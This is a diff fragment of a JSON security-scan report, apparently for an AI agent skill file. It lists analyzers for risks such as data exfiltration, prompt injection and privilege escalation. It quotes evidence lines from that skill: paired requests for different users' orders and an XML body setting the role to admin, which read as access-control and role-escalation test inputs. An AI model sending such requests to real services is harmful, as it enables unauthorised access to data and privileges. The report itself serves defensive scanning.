+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_anti_refusal",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_data_exfiltration",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_deserialization",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_excessive_agency",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_harmful_content",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_memory_poisoning",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_output_handling",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_privilege_escalation",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_prompt_injection",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_rogue_agent",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_ssrf",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_supply_chain",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_system_prompt_leakage",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_patterns_tool_misuse",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          },
+          {
+            "analyzer_id": "static_yara",
+            "status": "completed",
+            "planned_work": 1,
+            "completed": 1,
+            "partial": 0,
+            "skipped": 0,
+            "failed": 0,
+            "unaccounted": 0
+          }
+        ],
+        "references": [
+          {
+            "source_path": "SKILL.md",
+            "line": 30,
+            "column": 31,
+            "evidence": "GET /api/v1/users/1001/orders HTTP/1.1",
+            "target_path": null,
+            "status": "missing",
+            "disposition": "partial",
+            "reference_kind": "plain_path"
+          },
+          {
+            "source_path": "SKILL.md",
+            "line": 38,
+            "column": 31,
+            "evidence": "GET /api/v1/users/1002/orders HTTP/1.1",
+            "target_path": null,
+            "status": "missing",
+            "disposition": "partial",
+            "reference_kind": "plain_path"
+          },
+          {
+            "source_path": "SKILL.md",
+            "line": 236,
+            "column": 22,
+            "evidence": "-d '<?xml version=\"1.0\"?><user><name>test</name><role>admin</role></user>' \\",
+            "target_path": null,
+            "status": "missing",
+            "disposition": "partial",
+            "reference_kind": "quoted_or_code"
+          }
+        ],
+        "limitations": [],
+        "findings_before_filtering": 13,
+        "findings_after_filtering": 13,
+        "dependency_inspection": {
+          "enabled": false,
+          "status": "not_requested",
+          "mode": "static_local",
+          "locked_entries": 0,
+          "inspected_artifacts": 0,
+          "artifacts": []
+        }
+      }
+    }
+  ]
+}
